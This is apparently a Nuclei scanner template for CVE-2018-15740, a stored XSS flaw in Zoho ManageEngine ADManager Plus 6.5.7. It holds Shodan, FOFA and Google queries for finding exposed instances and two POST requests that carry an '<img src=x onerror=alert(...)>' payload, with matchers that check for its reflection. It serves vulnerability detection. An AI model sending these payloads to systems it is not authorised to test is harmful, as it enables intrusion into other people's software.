id: CVE-2018-15740

info:
  name: Zoho ManageEngine ADManager Plus 6.5.7 Stored XSS
  author: ProjectDiscoveryAI
  severity: medium
  description: Zoho ManageEngine ADManager Plus 6.5.7 has stored XSS on the "Workflow Delegation" "Requester Roles" screen.
  impact: |
    Successful exploitation could allow an attacker to execute malicious scripts in the context of a user's browser, leading to potential data theft or account compromise.
  remediation: |
    Upgrade to a patched version of Zoho ManageEngine ADManager Plus 6.5.8 or later to mitigate the vulnerability.
  reference:
    - http://packetstormsecurity.com/files/149097/ManageEngine-ADManager-Plus-6.5.7-Cross-Site-Scripting.html
    - https://drive.google.com/open?id=0Bw8rxEHEov76a0hwbFFVLVRMMjYxc05VV2JYc21NLXJiSHhJ
    - https://drive.google.com/open?id=0Bw8rxEHEov76cUVxZUxWS3lIanZ1VjhxSVBhdHBHUmJ1dmhr
    - https://www.exploit-db.com/exploits/45256/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2018-15740
    cwe-id: CWE-79
    epss-score: 0.00233
    epss-percentile: 0.62126
    cpe: cpe:2.3:a:zohocorp:manageengine_admanager_plus:6.5.7:*:*:*:*:*:*:*
  metadata:
    vendor: zohocorp
    product: manageengine_admanager_plus
    shodan-query: http.title:"manageengine"
    fofa-query: title="manageengine"
    google-query: intitle:"manageengine"

http:
  - method: POST
    path:
      - "{{BaseURL}}/ADMPTechnicians.do?methodToCall=listTechnicianRows"

    headers:
      Accept: "*/*"
      Accept-Encoding: "gzip, deflate"
      Accept-Language: "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7"
      Connection: "keep-alive"
      Content-Type: "application/x-www-form-urlencoded;charset=UTF-8"
      Cookie: "adscsrf=614ff642-779b-41aa-bff5-44370ad770c2; JSESSIONID=3CED862790101335DD0EB05EE42E4972; JSESSIONIDSSO=3E6785DB8D6DFD46D6C729579E68418D"
      Host: "{{Hostname}}"
      Origin: "{{BaseURL}}"
      Referer: "{{BaseURL}}/Delegation.do?selectedTab=delegation&selectedTile=technicians"
      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
      X-Requested-With: "XMLHttpRequest"

    body: |
      params={"startIndex":1,"range":10,"searchText":"\"><img src=x onerror=alert('TESTER')>","ascending":true,"isNavigation":false,"adminSelected":false,"isNewRange":false,"sortColumn":"FULL_NAME","typeFilters":"","domainFilters":"","viewType":"defaultView"}&adscsrf=614ff642-779b-41aa-bff5-44370ad770c2
    matchers:
      - type: word
        words:
          - "<img src=x onerror=alert('TESTER')>"
        part: body

  - method: POST
    path:
      - "{{BaseURL}}/RequesterRoles.do?selectedTab=workflow&methodToCall=ShowReqRoleResultRows"

    headers:
      Accept: "*/*"
      Accept-Encoding: "gzip, deflate"
      Accept-Language: "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7"
      Connection: "keep-alive"
      Content-Type: "application/x-www-form-urlencoded;charset=UTF-8"
      Cookie: "adscsrf=614ff642-779b-41aa-bff5-44370ad770c2; JSESSIONID=3CED862790101335DD0EB05EE42E4972; JSESSIONIDSSO=3E6785DB8D6DFD46D6C729579E68418D"
      Host: "{{Hostname}}"
      Origin: "{{BaseURL}}"
      Referer: "{{BaseURL}}/Delegation.do?selectedTab=delegation&selectedTile=technicians"
      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
      X-Requested-With: "XMLHttpRequest"

    body: |
      params={"startIndex":0,"range":25,"toIndex":0,"searchText":"\"><img src=x onerror=alert('ismailtasdelen')>","ascending":true,"sortColumn":"REQUESTER_ROLE_NAME","isNewRange":false}&adscsrf=614ff642-779b-41aa-bff5-44370ad770c2
    matchers:
      - type: word
        words:
          - "<img src=x onerror=alert('ismailtasdelen')>"
        part: body
